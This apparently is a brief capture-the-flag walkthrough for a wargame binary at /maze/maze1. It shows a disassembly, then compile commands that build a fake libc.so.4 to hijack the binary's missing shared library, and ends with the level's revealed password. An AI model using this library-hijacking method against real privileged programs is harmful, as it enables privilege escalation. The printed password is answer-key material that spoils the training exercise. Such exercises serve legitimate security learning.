
Dump of assembler code for function main:
```assembly
   0x0804849b <+0>:	push   %ebp
   0x0804849c <+1>:	mov    %esp,%ebp
   0x0804849e <+3>:	push   $0x8048540
   0x080484a3 <+8>:	call   0x8048380 <puts@plt>
   0x080484a8 <+13>:	add    $0x4,%esp
   0x080484ab <+16>:	mov    $0x0,%eax
   0x080484b0 <+21>:	leave  
   0x080484b1 <+22>:	ret    
```
End of assembler dump.

running this gets us the error: error while loading shared libraries: ./libc.so.4: cannot open shared object file: No such file or directory

so, we can use library function hijacking...

file lib.c included

run:
```sh
gcc -m32 -fPIC -c lib.c -o libc.o
gcc -m32 -shared -Wl,-soname,libc.so.4 -o libc.so.4 libc.o
/maze/maze1
```

or run:
```sh
gcc -m32 -fPIC -c lib.c -o libc.o
ld -shared -m elf_i386 -o libc.so.4 libc.o -ldl
/maze/maze1
```

we get: fooghihahr


